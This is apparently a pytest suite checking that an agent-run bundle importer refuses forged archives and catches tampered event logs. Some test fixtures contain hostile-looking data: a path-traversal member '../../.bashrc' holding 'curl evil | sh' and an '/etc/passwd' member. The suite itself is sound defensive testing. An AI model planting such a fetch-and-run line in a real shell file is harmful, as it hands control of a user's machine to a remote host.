"""An imported bundle is untrusted input: data, never code (PRD §31.9, design constraint 5).

Two families of test here.

**Refusal.** A bundle from someone else can contain anything. The archive reader must
refuse a member that is not on the allowlist, a traversal path, and an oversized member —
before reading a byte of it.

**Detection.** A tampered event log must be caught by recomputation, not by trusting the
sender's own hash. `verify` recomputes the canonical log hash and the chain from
`events.jsonl` and reports the *first* altered event, which is what PRD §36's
`E-BUNDLE-001` message promises.
"""

from __future__ import annotations

import warnings
import zipfile
from pathlib import Path

import pytest

from agentdx.events.schema import Event
from agentdx.store import bundle as bundles
from agentdx.store.sqlite import Store


@pytest.fixture
def exported(populated: tuple[Store, str, tuple[Event, ...]], tmp_path: Path) -> Path:
    """Return a freshly exported bundle for the populated run."""
    store, run_id, _ = populated
    return bundles.export_bundle(store, run_id, tmp_path / "run.agentdx")


def _rewrite(source: Path, dest: Path, replacements: dict[str, str | None]) -> Path:
    """Copy a bundle, replacing or dropping the named members. Used to forge bad bundles."""
    with zipfile.ZipFile(source, "r") as original:
        members = {name: original.read(name) for name in original.namelist()}
    for name, value in replacements.items():
        if value is None:
            members.pop(name, None)
        else:
            members[name] = value.encode("utf-8")
    with zipfile.ZipFile(dest, "w", compression=zipfile.ZIP_DEFLATED) as forged:
        for name, payload in members.items():
            forged.writestr(name, payload)
    return dest


def test_a_clean_bundle_verifies(exported: Path) -> None:
    """The happy path: a freshly exported bundle verifies with no problems."""
    result = bundles.verify(exported)
    assert result.ok, result.problems
    assert result.computed_log_hash == result.declared_log_hash
    assert result.computed_chain_head == result.declared_chain_head
    assert result.first_bad_seq is None


def test_an_unknown_member_is_refused(exported: Path, tmp_path: Path) -> None:
    """`E-BUNDLE-005`: only allowlisted member names are read.

    An allowlist rather than a denylist of dangerous patterns: a denylist has to anticipate
    every encoding of a traversal, an allowlist has to anticipate nothing.
    """
    forged = _rewrite(exported, tmp_path / "extra.agentdx", {"setup.py": "import os"})
    with pytest.raises(bundles.BundleError) as excinfo:
        bundles.verify(forged)
    assert excinfo.value.code == "E-BUNDLE-005"
    assert "setup.py" in str(excinfo.value)


def test_a_path_traversal_member_is_refused(exported: Path, tmp_path: Path) -> None:
    """`E-BUNDLE-005`: `../` in a member name is refused (§31.9)."""
    forged = _rewrite(exported, tmp_path / "traversal.agentdx", {"../../.bashrc": "curl evil | sh"})
    with pytest.raises(bundles.BundleError) as excinfo:
        bundles.verify(forged)
    assert excinfo.value.code == "E-BUNDLE-005"


def test_an_absolute_member_is_refused(exported: Path, tmp_path: Path) -> None:
    """`E-BUNDLE-005`: an absolute member name is refused."""
    forged = _rewrite(exported, tmp_path / "absolute.agentdx", {"/etc/passwd": "root:x:0:0"})
    with pytest.raises(bundles.BundleError) as excinfo:
        bundles.verify(forged)
    assert excinfo.value.code == "E-BUNDLE-005"


def test_a_missing_required_member_is_refused(exported: Path, tmp_path: Path) -> None:
    """`E-BUNDLE-006`: a bundle without its events cannot be verified, let alone imported."""
    forged = _rewrite(exported, tmp_path / "gutted.agentdx", {bundles.EVENTS_JSONL: None})
    with pytest.raises(bundles.BundleError) as excinfo:
        bundles.verify(forged)
    assert excinfo.value.code == "E-BUNDLE-006"


def test_a_non_zip_file_is_refused(tmp_path: Path) -> None:
    """`E-BUNDLE-001`: a file that is not a zip is refused with a readable message."""
    path = tmp_path / "not.agentdx"
    path.write_text("this is not an archive", encoding="utf-8")
    with pytest.raises(bundles.BundleError) as excinfo:
        bundles.verify(path)
    assert excinfo.value.code == "E-BUNDLE-001"


def test_a_tampered_event_is_detected_and_located(exported: Path, tmp_path: Path) -> None:
    """`verify` recomputes rather than trusting, and names the first altered event.

    The sender's `manifest.json` and `events.sha256` both still claim the original hash;
    only recomputation from `events.jsonl` catches this.
    """
    with zipfile.ZipFile(exported, "r") as archive:
        lines = archive.read(bundles.EVENTS_JSONL).decode("utf-8").splitlines()
    lines[3] = lines[3].replace('"virtual_ts_ms":40', '"virtual_ts_ms":999')
    forged = _rewrite(
        exported, tmp_path / "tampered.agentdx", {bundles.EVENTS_JSONL: "\n".join(lines) + "\n"}
    )

    result = bundles.verify(forged)
    assert not result.ok
    assert result.computed_log_hash != result.declared_log_hash
    assert any("canonical log hash" in p for p in result.problems)
    assert any("chain head" in p for p in result.problems)
    assert result.first_bad_seq == 3, "detected but not located — see test below"


def test_a_removed_event_is_detected(exported: Path, tmp_path: Path) -> None:
    """Truncating the log changes both the count and the hash, and both are reported."""
    with zipfile.ZipFile(exported, "r") as archive:
        lines = archive.read(bundles.EVENTS_JSONL).decode("utf-8").splitlines()
    forged = _rewrite(
        exported,
        tmp_path / "short.agentdx",
        {bundles.EVENTS_JSONL: "\n".join(lines[:-1]) + "\n"},
    )
    result = bundles.verify(forged)
    assert not result.ok
    assert any("events; the manifest declares" in p for p in result.problems)


def test_an_internally_inconsistent_bundle_is_detected(exported: Path, tmp_path: Path) -> None:
    """`events.sha256` disagreeing with `manifest.json` is reported on its own.

    Two places in the archive state the same hash. A forger who updates one and not the
    other is caught by the cross-check even before recomputation.
    """
    forged = _rewrite(
        exported, tmp_path / "inconsistent.agentdx", {bundles.EVENTS_SHA256: "blake2b:" + "0" * 64}
    )
    result = bundles.verify(forged)
    assert not result.ok
    assert any("disagrees with" in p for p in result.problems)


def test_an_incompatible_schema_version_is_reported(exported: Path, tmp_path: Path) -> None:
    """`E-BUNDLE-002`: a bundle from a different event schema names both versions."""
    with zipfile.ZipFile(exported, "r") as archive:
        manifest = archive.read(bundles.MANIFEST).decode("utf-8")
    forged = _rewrite(
        exported,
        tmp_path / "future.agentdx",
        {bundles.MANIFEST: manifest.replace('"schema_version":1', '"schema_version":99')},
    )
    result = bundles.verify(forged)
    assert not result.ok
    assert any("E-BUNDLE-002" in p and "99" in p for p in result.problems)


def test_import_refuses_a_bad_bundle_before_writing_anything(
    exported: Path, tmp_path: Path
) -> None:
    """A failed verification means no rows are written at all.

    Half-importing a tampered log would leave a database that looks populated and is not
    trustworthy — worse than refusing outright.
    """
    with zipfile.ZipFile(exported, "r") as archive:
        lines = archive.read(bundles.EVENTS_JSONL).decode("utf-8").splitlines()
    lines[2] = lines[2].replace('"sched_step":2', '"sched_step":222')
    forged = _rewrite(
        exported, tmp_path / "bad.agentdx", {bundles.EVENTS_JSONL: "\n".join(lines) + "\n"}
    )

    with Store.open(tmp_path / "fresh.db") as fresh:
        with pytest.raises(bundles.BundleError) as excinfo:
            bundles.import_bundle(fresh, forged)
        assert excinfo.value.code == "E-BUNDLE-001"
        assert fresh.list_runs() == ()
        assert fresh.connection.execute("SELECT COUNT(*) FROM events").fetchone()[0] == 0


def test_bundle_members_are_exactly_the_documented_set(exported: Path) -> None:
    """The archive contains only allowlisted members, and no `.zst` (deviation D-13).

    The `.zst` assertion is the executable form of the declared deviation: §20.7 names
    zstd-compressed members, `zstandard` is outside the permitted dependency set, and the
    zip container compresses the members instead.
    """
    with zipfile.ZipFile(exported, "r") as archive:
        names = set(archive.namelist())
        assert names <= bundles.MEMBERS
        assert set(bundles.REQUIRED_MEMBERS) <= names
        assert not any(n.endswith(".zst") for n in names)
        assert all(info.compress_type == zipfile.ZIP_DEFLATED for info in archive.infolist())


def test_the_bundle_contains_no_executable_member(exported: Path) -> None:
    """Nothing in a bundle is code. The graph travels as a hash, not as a module.

    Asserted structurally rather than by inspecting content: if no member can be a `.py`,
    a `.sh` or anything else runnable, then "import never executes anything" does not
    depend on the importer remembering not to.
    """
    with zipfile.ZipFile(exported, "r") as archive:
        for name in archive.namelist():
            assert Path(name).suffix in {".json", ".jsonl", ".yaml", ".sha256", ".chain"}


def test_cache_bodies_are_excluded_by_default(exported: Path) -> None:
    """Privacy by default (I8, §31.3): no bodies unless explicitly requested.

    The manifest records the exclusion, and `verify` reports it as `re_executable=False`,
    so the recipient is told rather than discovering it when a replay fails.
    """
    with zipfile.ZipFile(exported, "r") as archive:
        assert bundles.CACHE_ENTRIES not in archive.namelist()
        assert bundles.CACHE_MANIFEST in archive.namelist()
    result = bundles.verify(exported)
    assert result.includes_cache_bodies is False
    assert result.re_executable is False


def test_cache_bodies_are_included_on_request(
    populated: tuple[Store, str, tuple[Event, ...]], tmp_path: Path
) -> None:
    """`--include-cache-bodies` writes the slice and records that it did."""
    store, run_id, events = populated
    entries = bundles.derive_cache_manifest(events)
    with_bodies = tuple(
        bundles.CacheEntry(
            cache_key=e.cache_key,
            model=e.model,
            prompt_hash=e.prompt_hash,
            response_hash=e.response_hash,
            body=f"recorded response for {e.cache_key}",
        )
        for e in entries
    )
    path = bundles.export_bundle(
        store,
        run_id,
        tmp_path / "full.agentdx",
        cache_entries=with_bodies,
        include_cache_bodies=True,
    )
    with zipfile.ZipFile(path, "r") as archive:
        assert bundles.CACHE_ENTRIES in archive.namelist()
    result = bundles.verify(path)
    assert result.ok and result.re_executable


def test_the_cache_manifest_is_derived_from_the_log(
    populated: tuple[Store, str, tuple[Event, ...]],
) -> None:
    """A bundle is self-contained without depending on the cache module.

    Every `llm_call` payload carries the key, model and hashes PRD §20.7 asks for, so the
    manifest of "which cache entries a replay would need" comes out of the log itself.
    """
    _, _, events = populated
    entries = bundles.derive_cache_manifest(events)
    assert entries
    assert [e.cache_key for e in entries] == sorted(e.cache_key for e in entries)
    assert all(e.body is None for e in entries)


# ---------------------------------------------------------------------------------------
# OP-2 regressions. Each of these failed before the OP-3 repair; the finding is named.
# ---------------------------------------------------------------------------------------


def test_a_tampered_event_is_located_at_its_exact_seq(exported: Path, tmp_path: Path) -> None:
    """OP-2 F2: `first_bad_seq` names the altered event, not merely that one exists.

    Before the repair `verify` compared only the *final* chain head, so a tampered event
    was detected and `first_bad_seq` stayed None — an implementation hardcoding `return
    None` passed the whole suite. PRD §36 specifies the message "Bundle integrity check
    failed at event 1043", which a rolling log hash cannot produce; the `events.chain`
    member added at bundle format 2 can.
    """
    with zipfile.ZipFile(exported, "r") as archive:
        lines = archive.read(bundles.EVENTS_JSONL).decode("utf-8").splitlines()
    target = 7
    assert f'"seq":{target}' in lines[target]
    lines[target] = lines[target].replace('"sched_step":7', '"sched_step":9999')
    forged = _rewrite(
        exported, tmp_path / "located.agentdx", {bundles.EVENTS_JSONL: "\n".join(lines) + "\n"}
    )

    result = bundles.verify(forged)
    assert not result.ok
    assert result.first_bad_seq == target
    assert any(f"failed at event {target}" in p for p in result.problems)


def test_a_chain_member_of_the_wrong_length_is_reported_as_such(
    exported: Path, tmp_path: Path
) -> None:
    """A short `events.chain` is its own defect, and must not name an innocent event.

    `canonical.verify_chain` has a known length-mismatch branch that returns an arbitrary
    seq (recorded in CONTEXT.md §14). Reporting that number as "event N is corrupt" would
    accuse an event that is fine, so the length is checked first.
    """
    with zipfile.ZipFile(exported, "r") as archive:
        chain = archive.read(bundles.EVENTS_CHAIN).decode("utf-8").splitlines()
    forged = _rewrite(
        exported, tmp_path / "shortchain.agentdx", {bundles.EVENTS_CHAIN: "\n".join(chain[:-2])}
    )
    result = bundles.verify(forged)
    assert not result.ok
    assert result.first_bad_seq is None
    assert any("cannot be checked against the log" in p for p in result.problems)


def test_duplicate_member_names_are_refused(exported: Path, tmp_path: Path) -> None:
    """OP-2 F-dup: two entries with one name is a zip-confusion vector.

    This reader resolves a duplicated name to one entry; a different unzip tool resolves it
    to the other. What was verified would then not be what a user inspecting the archive
    sees, so the archive is refused rather than reconciled.
    """
    dup = tmp_path / "dup.agentdx"
    with zipfile.ZipFile(exported, "r") as archive:
        members = [(n, archive.read(n)) for n in archive.namelist()]
    with warnings.catch_warnings():  # zipfile warns about the duplicate we are staging
        warnings.simplefilter("ignore", UserWarning)
        with zipfile.ZipFile(dup, "w", compression=zipfile.ZIP_DEFLATED) as forged:
            for name, payload in members:
                forged.writestr(name, payload)
            forged.writestr(bundles.EVENTS_JSONL, b'{"second entry":1}\n')

    with pytest.raises(bundles.BundleError) as excinfo:
        bundles.verify(dup)
    assert excinfo.value.code == "E-BUNDLE-005"
    assert "duplicate" in str(excinfo.value)


def test_the_bundle_carries_a_per_event_chain(exported: Path) -> None:
    """Bundle format 2 ships `events.chain`: one `this_hash` per event, in seq order."""
    with zipfile.ZipFile(exported, "r") as archive:
        chain = archive.read(bundles.EVENTS_CHAIN).decode("utf-8").splitlines()
        events = archive.read(bundles.EVENTS_JSONL).decode("utf-8").splitlines()
    assert len(chain) == len(events)
    assert all(line.startswith("blake2b:") for line in chain)
    assert bundles.BUNDLE_FORMAT_VERSION >= 2
